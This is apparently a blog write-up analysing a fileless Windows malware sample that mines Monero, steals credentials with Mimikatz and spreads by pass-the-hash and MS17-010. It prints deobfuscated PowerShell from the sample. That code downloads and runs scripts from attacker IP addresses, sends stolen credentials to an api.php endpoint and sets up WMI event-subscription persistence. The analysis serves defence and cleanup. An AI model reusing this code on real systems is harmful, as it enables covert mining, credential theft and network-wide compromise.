# FileLess Malware Analysis  

### Scenario  

Here I'm going to show the last sample of fileless malware I found. First, point out that I'm not a Malware Analyst yet, nor I'm a developer, so apologize for the basic content.  

Symptoms were servers rebooting and high CPU, two particular cases that should be related.   

First thing I checked was the processes in those machines that had high CPU. 8 running powershell processes making requests to port 14444. I made a traffic capture right away and found dns queries trying to resolve domains like:  

>*pool.minexmr.com*  
>*xmr-us-east1.nanopool.org*  
>*xmr-eu1.nanopool.org*  
>*xmr-us-west1.nanopool.org*  
>*xmr-asia1.nanopool.org*  
>*xmr-eu2.nanopool.org*  

Easy, another miner but there were still a lot of questions without answers. The servers had updated antivirus, why didn't they detect it? How was it propagating the entire network? Why were the servers rebooting? How had the miner gained persistency? We'll get there...  

The powershell command told us nothing:  

>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden "$mon = ([WmiClass] 'root\default:systemcore_Updater').Properties['mon'].Value;$funs = ([WmiClass] 'root\default:systemcore_Updater').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs)));Invoke-Command  -ScriptBlock $RemoteScriptBlock -ArgumentList @($mon, $mon, 'Void', 0, '', '')"  

It has too many unknown parameters. So next thing I checked was the scheduled tasks. The server had been rebooted and it was still there so... This was the key move, I found a wmi task named DSM Event Log Filter that run the following commnad:  
  
>%SystemRoot%\system32\WindowsPowerShell\v1.0\PowerShell.exe -NoP -NonI -W Hidden -E JABzAGUAPQBAACgAJwAxADkANQAuADIAMgAuADEAMgA3AC4AOQAzACcALAAnAHUAcABkAGEAdABlAC4AdwBpAG4AZABvAHcAcwBkAGUAZgBlAG4AZABlAHIAaABvAHMAdAAuAGMAbAB1AGIAJwAsACcAaQBuAGYAbwAuAHcAaQBuAGQAbwB3AHMAZABlAGYAZQBuAGQAZQByAGgAbwBzAHQALgBjAGwAdQBiACcAKQANAAoAJABuAGkAYwA9ACcAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnAA0ACgBmAG8AcgBlAGEAYwBoACgAJAB0ACAAaQBuACAAJABzAGUAKQANAAoAewANAAoAIAAgACAAIAAkAHAAaQBuAD0AdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAHQADQAKACAAIAAgACAAaQBmACAAKAAkAHAAaQBuACAALQBuAGUAIAAkAG4AdQBsAGwAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABuAGkAYwA9ACQAdAANAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAkAG4AaQBjAD0AJABuAGkAYwArACIAOgA4...  

That's, of course, a base64 encoded value and the parameters windowstyle set to hidden, non-interactive and no-profile didn't sound very appealing...   

Let's analyse it. I will show code pieces as I explain it's behaviour, but I won't post the entire code. If anyone needs or wants it let me know.  

First thing we see is that it tries to download some resources from four different places. First it test its connectivity to each of them and tries to download two files from the port 8000. The first one, ver.txt, I couldn't find because it's not there anymore, but I found the second one info6.ps1. Well analyze both at the same time because the info6.ps1 is just an extension of the first one.  

>...  
>$se=@('195.22.127.93','update.windowsdefenderhost.club','info.windowsdefenderhost.club')  
>$nic='www.windowsdefenderhost.club'  
>foreach($t in $se)  
>{
>    $pin=test-connection $t
>    if ($pin -ne $null)
>    {
>        $nic=$t
>        break
>    }
>}
>$nic=$nic+":8000"
>$ver=(New-Object Net.WebClient).DownloadString("hxxp://$nic/ver.txt").Trim()   
>if($ver -ne $null){   
>    if($ver -ne ([WmiClass] 'root\default:systemcore_Updater').Properties['ver'].Value){ 
>        IEX (New-Object Net.WebClient).DownloadString("hxxp://$nic/info6.ps1")
>        return 
>        } 
>    }
>...

Let's take a look to the info6.ps1 file:  

>$fa = "G9hZFN0cmluZygnaHR0cDovLzE5NS4yMi4xMjcuMTU3OjgwMDAvaW5mbzYucHMxJyl9IiAAVeguAAAAuYIAAMAPMkyNDTQAAABEOch0GTlFAHQKiVUEiUUAxkX4AEmRUFpIweogDzBdw0iNLQAQAABIwe0MSMHlDEiD7XDDDwH4ZUiJJCUQAAAAZUiLJCWoAQAAaitl/zQlEAAAAFBQVejF////SItFAEiDwB9IiUQkEFFSQVBBUUFSQVMxwLIB8A+wVfh1FLmCAADAi0UAi1UEDzD76A4AAAD6QVtBWkFZQVhaWV1Yw0FXQVZXVlNQTIt9AEnB7wxJwecMSYHvABAAAGZBgT9NWnXxTIl9CGVMizQliAEAAL94fPTb6AEBAABIkb8/X2R36PwAAACLQAOJwz0ABAAAcgODwBBIjVAoTI0EEU2JwU2LCU05yA+ExgAAAEyJyEwp8Eg9AAcAAHfmTSnOv+EUARfouwAAAIt4A4PHCEiNNBno9AAAAD3Yg+A+dBA92IPgPnQJSIsMOUgp+evgv0i4GLjohAAAAEiJRfBIjTQRSInzSItbCEg53nT3So0UM78+TPjO6GkAAACLQANIg3wC+AB03kiNTRBNMcBMjQ2pAAAAVWoBVUFQSIPsIL/EXBlt6DUAAAB........." & ( $pSHOmE[4]+$PshomE[30]+'x') ( -JOIn ((15, 12,146 , 165 , 156,143, 164 ,151 ,157, 156,40, 162, 145 , 154,157 , 141,144 , 40 , 50,44,141 ,51 , 173 , ....)| FoReACh{ ( [cHar]( [conVeRT]::ToiNt16(($_.tOsTrING() ),8)))} ) )  

This file comes with a ultra large b64, and some octal encoded code. The base64 part is not valuable as it comes, but the octal one is. Let's start there:  

>...  
>function reload ($a){  
>    $b=""
>    $size=[Math]::Floor($a.Length/1000)
>    for($i=$size-1;$i -ge 0;$i--)
>    {
>        $b += $a.SubString($i*1000,1000)
>    }
>    $b += $a.SubString($size*1000)
>    return $b
>}
>
>$fa = Re`LO`AD $fa  
>
>$mimi = $fa.SubString(0, 1131864)  
>$mon = $fa.SubString(1131870, 357720)  
>$funs = $fa.SubString(3654090, 578480)  
>$vcp = $fa.SubString(1489597, 880172)  
>$vcr = $fa.SubString(2369773, 1284312)  
>$sc = $fa.SubString(4232583, 3256)  
>...  

First thing we see, a way to understand the b64. It must be processed by the "reload" function and cut into pieces. So, the first part of the resource it download has 6 parts. I made a quick and simple python script to extract each part (poor programming... T.T):  

>import base64  
>
>def reload(test):  
>    b=""
>    size=len(test)/1000
>    for i in xrange(size-1,0,-1):
>        b+=str(test[i*1000:i*1000+1000])
>    b+=str(test[0:1000])
>    return b
>
>fa=open("/home/carbreal/Desktop/FileLessMalware/fa_info6","r").read()
>a=reload(fa)
>
>mimi=open("/home/carbreal/output/mimi","w")  
>mon=open("/home/carbreal/output/mon","w")  
>funs=open("/home/carbreal/output/funs","w")  
>vcp=open("/home/carbreal/output/vcp","w")  
>vcr=open("/home/carbreal/output/vcr","w")  
>sc=open("/home/carbreal/output/sc","w")  
>
>mimi.write(base64.b64decode(a[0:0+1131864]))  
>mon.write(base64.b64decode(a[1131870:1131870+357720]))  
>funs.write(base64.b64decode(a[3654090:3654090+578480]))  
>vcp.write(base64.b64decode(a[1489597:1489597+880172]))  
>vcr.write(base64.b64decode(a[2369773:2369773+1284312]))  
>sc.write(a[4232583:4232583+3256])  
>
>mimi.close()  
>mon.close()  
>funs.close()  
>vcp.close()  
>vcr.close()  
>sc.close()  

Now we have the 6 pieces. Of course, $mimi is Mimikatz, $mon is a standart monero miner, $funs is a bunch of functions that will be used, $vcp is msvcp120.dll, $vcr is msvcr120.dll and $sc is another code fragment.  

First of all, these is the list of functions inside funs:  

>function ConvertTo-DecimalIP ([Net.IPAddress]$IPAddress)  
>function ConvertTo-DottedDecimalIP ([String]$IPAddress)  
>function Get-NetworkRange( [String]$IP, [String]$Mask )   
>function Get-creds($PEBytes64, $PEBytes32)  
>function test-ip  
>function sentfile($filepath,$wmipath)  
>function make_smb1_anonymous_login_packet   
>function smb1_anonymous_login($sock)  
>function negotiate_proto_request()  
>function smb_header($smbheader)   
>function smb1_get_response($sock)  
>function client_negotiate($sock)  
>function tree_connect_andx($sock, $target, $userid)  
>function tree_connect_andx_request($target, $userid)   
>function smb1_anonymous_connect_ipc($target)  
>function make_smb1_nt_trans_packet($tree_id, $user_id)   
>function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout)   
>function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout)   
>function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $  
>function createSessionAllocNonPaged($target, $size)   
>function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os)   
>function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)  
>function make_smb2_payload_headers_packet()  
>function eb7($target ,$shellcode)   
>function createFakeSrvNetBuffer8($sc_size)  
>function createFeaList8($sc_size, $ntfea)  
>function make_smb1_login8_packet8   
>function make_ntlm_auth_packet8($user_id)   
>function smb1_login8($sock)  
>function negotiate_proto_request8($use_ntlm)  
>function smb_header8($smbheader)   
>function smb1_get_response8($sock)  
>function client_negotiate8($sock , $use_ntlm)  
>function tree_connect_andx8($sock, $target, $userid)  
>function tree_connect_andx8_request($target, $userid)    
>function make_smb1_nt_trans_packet8($tree_id, $user_id)    
>function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout)   
>function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $  
>function createSessionAllocNonPaged8($target, $size)   
>function make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)    
>function make_smb2_payload_headers_packet8($for_nx)  
>function eb8($target,$sc)     

And this is the code fragment inside sc:  

>cmd /c powershell -nop -noni -w hidden "$a=([string](Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains('DSM Event Log Filter')))) {IEX(New-Object Net.WebClient).DownloadString('hxxp://195.22.127.157:8000/info6.ps1')}"  

We will explain this later. Let's keep looking at the info6.ps1 decoded file:  

First, it checks the operating system of the machine it is in, because if the architecture is not right, it will need another resources. In this case we see that if it's not in a 64 bit environment it will grab the info3.ps1, which is a 32 bit version of itself.  
  
>...  
>$se=@(('195.22.127.157'), ('93.174.93.73'))  
>$nic=('195.22.127.157')  
>foreach($t in $se)  
>{
>  $pin=TESt-C`ONN`eCt`ioN $t
>  if ($pin -ne $null)
>  {
>    $nic=$t
>    break
>  }
>}
>$nic = $nic + (':8000')
>if (!(gE`T`-wmioBj`eCT Win32_OperatingSystem).OSArchitecture.contains('64'))  
>{
>  i`ex (n`eW-ob`jeCT Net.WebClient).DownloadString("hxxp://$nic/info3.ps1")
>  return
>}
>...
  
Now it takes all the variables, and creates an object with them to load them in memory:  

>...  
>$StaticClass = NE`w-OBje`ct Management.ManagementClass((('root{0}default') -f [ChaR]92), $null, $null)  
>$StaticClass.Name = ('Win32_Services')  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('mimi'), $mimi)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('mon'), $mon)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('vcp'), $vcp)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('vcr'), $vcr)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('funs'), $funs)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add('sc', $sc)  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('ipsu'), " ")  
>$StaticClass.Put()  
>$StaticClass.Properties.Add(('i17'), " ")  
>$StaticClass.Put()  
>...  

  
After that, we noticed one big variable named "Script", I will only point out some ineteresting lines:  

>...
>$Script=@'....  
>   $funs = ([WmiClass] 'root\default:Win32_Services').Properties['funs'].Value  
>   $defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))  
>   iex $defun
>...  
  
Here it checks the existence of the two dll needed for the script to run properly, and if they are not there, it gets them from memory. Not malicious code, still file-less malware.  

>...  
>$dirpath=$env:SystemRoot+'\system32'  
>if  (!(test-path $dirpath )){  
>  $dirpath=$env:SystemRoot
>}
>if (!(test-path ($dirpath+'\msvcp120.dll')))
>  {sentfile ($dirpath+'\msvcp120.dll') 'vcp'}  
>if (!(test-path ($dirpath+'\msvcr120.dll')))  
>  {sentfile ($dirpath+'\msvcr120.dll') 'vcr'}  
>...  

After that, it gets the number of powershell processes there are currently running and checks the connection of each of them.  

>...  
>[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}  
>$tcpconn = netstat -anop tcp  
>$exist=$False  
>if ($psids -ne $null )  
>{
>  foreach ($t in $tcpconn)
>  {
>    $line =$t.split(' ')| ?{$_}
>    if ($line -eq $null)
>      {continue}
>    if (($psids[0] -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444")) )
>    {
>      $exist=$true
>      break
>    }
>  }
>}
>...

If there are less than 8 processes of powershell running it runs another thread of the monero miner. 

>...  
>if (!$exist -and ($psids.count -le 8))  
>{
>   $cmdmon="powershell -NoP -NonI -W Hidden `"`$mon = ([WmiClass] 'root\default:Win32_Services').Properties['mon'].Value;`$funs = ([WmiClass] 'root\default:Win32_Services').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$funs)));Invoke-Command  -ScriptBlock `$RemoteScriptBlock -ArgumentList @(`$mon, `$mon, 'Void', 0, '', '')`""
>   $vbs = New-Object -ComObject WScript.Shell
>   $vbs.run($cmdmon,0)
>}
>...

But, what is the Mimikatz for? Apparently, It's also kind of a non-interactive botnet, It uploads every credential stolen.  
We see a couple servers listening for our data. It checks for connectivity and, for each credential, it appends the b64 of the credential to the data parameter and it makes a GET request to the api.php with the data.   

>...  
>$NTLM=$False  
>$mimi = ([WmiClass] 'root\default:Win32_Services').Properties['mimi'].Value  
>$a, $NTLM= Get-creds $mimi $mimi  
>$se=@('195.22.127.157', '93.174.93.73')  
>$nic='195.22.127.157'  
>foreach($t in $se)  
>{
>  $pin=test-connection $t
>  if ($pin -ne $null)
>  {
>    $nic=$t
>    break
>  }
>}
>$nic=$nic+":8000"
>if ($a.count -ne 0)  
>{
>  foreach($aa in $a){
>    $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($aa))
>    (New-Object Net.WebClient).DownloadString("hxxp://$nic/api.php?data=" + $data)
>  }
>}
>...

Now we know what is its behaviour. But we are still not there. A couple of questions more. Propagation? Persistency? Let's talk about that now.  

### Propagation

In another interesting block, we see that it checks the network searching for propagation. First, checks with the Mimikatz credentials to log in, in case it's feeling lucky, and if it doesn't work, it runs the PingCastle Scanner that the funs contained searching for ms17-010 vulnerable systems in the network.  

>...  
>foreach ($Network in $Networks)  
>{
>  ...  
>  $SubnetMask  = $Network.IPSubnet[0]
>  $ips=Get-NetworkRange $IPAddress $SubnetMask
>  $tcpconn = netstat -anop tcp
>  ...
>  if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
>  foreach ($ip in $ips)
>  {
>    ...
>    if ((Test-Connection $ip -count 1) -ne $null  -and $ipsu -notcontains $ip)
>    {
>      $re=0
>      if ($a.count -ne 0)
>      {
>        $re = test-ip -ip $ip -creds $a -nic $nic -ntlm $NTLM
>      }
>      if ($re -eq 1)
>      {
>        $ipsu = $ipsu + " " + $ip
>      }
>      else
>      {
>        $vul=[PingCastle.Scanners.m17sc]::Scan($ip)
>        if ($vul -and $i17 -notcontains $ip)
>        {
>          $res = eb7 $ip $sc
>          if ($res -ne $true)
>          {
>            eb8 $ip $sc
>          }
>          $i17 = $i17 + " " + $ip
>        }
>      }
>    }
>  }
>}
>...

The test-ip function is the credentials one, and if not, the eb7 and eb8 is the function than exploits the ms17-010 vulnerability.  

This is a block extracted from test-ip, where it tries the credentials and runs the shellcode. Here we can see better the two versions of the resources, the 64 bits one and the other, 32 bits.  

>...  
>foreach ($c in $creds)
>{
>  $User=$c.split(" ")[0]
>  $domain=$c.split(" ")[1]
>  $passwd=$c.split(" ")[2]
>  $password = coNvERTto-SECUreSTRiNg $passwd -asplaintext -force 
>  $cmd ="cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('hxxp://$nic/info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('hxxp://$nic/info3.ps1')}""
>  ... 
>  $ntlmhash=$passwd
>  $cmdntlm =$cmd
>  $re=iNVoKe-WMiEXeC -Target $ip -Username $user -Hash $ntlmhash
>  if ($re.contains(('a'+'ccesse'+'d WM'+'I')))
>  {
>    $re=iNVOKe-WmIeXEC -Target $ip -Username $user -Hash $ntlmhash -command $cmdntlm
>    ...

The second way is via ms17-010 vulnerability, with the eb8 and eb7 functions, and the shellcode contained in the sc variable. First, it checks if it's already there and runs the info6.ps1 if not:  

>cmd /c powershell -nop -noni -w hidden "$a=([string](Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding ));if(($a -eq $null) -or (!($a.contains('DSM Event Log Filter')))) {IEX(New-Object Net.WebClient).DownloadString('hxxp://195.22.127.157:8000/info6.ps1')}"  

### Persistency 

Now that we know how it walks around the network, let's see how it gains persistency.  
As we can see in the following code, it initiates an instance to subscribe to a permanent event subscription with the script.   
Here are the two variables needed:  

>...  
>$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)  
>$EncodedScript= [System.Convert]::ToBase64String($Scriptbytes)  
>
>$Query = (('SELECT * FROM __InstanceModificationEvent WITHIN 5600 WHERE TargetInstance ISA YV0Win32_PerfFormattedData_PerfOS_SystemYV0').rEPlAcE(([chaR]89+[chaR]86+[chaR]48),[StRing][chaR]39))  
>g`et-`wmioBj`eCt -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter (('__Path LIKE ABa%DSM Event Log Consumer%ABa')-RePlacE ([CHAR]65+[CHAR]66+[CHAR]97),[CHAR]39) | REmOvE`-`Wmio`B`jecT  
>gE`T-WmiOBjE`CT -Namespace root\Subscription -Class __EventFilter -Filter (('name = QZBDSM Event Log FilterQZB').rEPLAcE('QZB',[STRInG][chaR]39)) | ReMOVe`-Wm`i`OB`JEcT  
>Get`-w`MIobjECT -Namespace root\Subscription -Class CommandLineEventConsumer -Filter (('Name=V40DSM Event Log ConsumerV40').REpLacE('V40',[stRINg][chaR]39)) | re`m`O`V`E-wMIObJECT  
>
>$FilterParams = @{  
>  Namespace = (('rootRkGsubscription').REPLAcE('RkG','\'))
>  Class = ('__EventFilter')
>  Arguments =@{Name=$filterName;EventNamespace=(('rootSRFcimv2').RePlacE('SRF',[sTRIng][cHaR]92));QueryLanguage=('WQL');Query=$Query}
>  ErrorAction = ('SilentlyContinue')
>}
>$WMIEventFilter =  SET-`WMIInst`A`NCE @FilterParams
>
>$ConsumerParams = @{  
>  Namespace = (('root{0}subscription') -f  [cHaR]92)
>  Class = ('CommandLineEventConsumer')
>  Arguments =@{Name=$consumerName; CommandLineTemplate= ('powershell.exe -NoP -NonI -W Hidden  -E ') + $EncodedScript}
>  ErrorAction = ('SilentlyContinue')
>}
>$WMIEventConsumer = sEt`-WMii`N`stancE @ConsumerParams
>...
  
And here, it uses them to gain persistency  

>...  
>sEt-wmI`in`S`TAN`CE -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}  
>...  

  
Now we know how it behaves and how to get rid of it.  
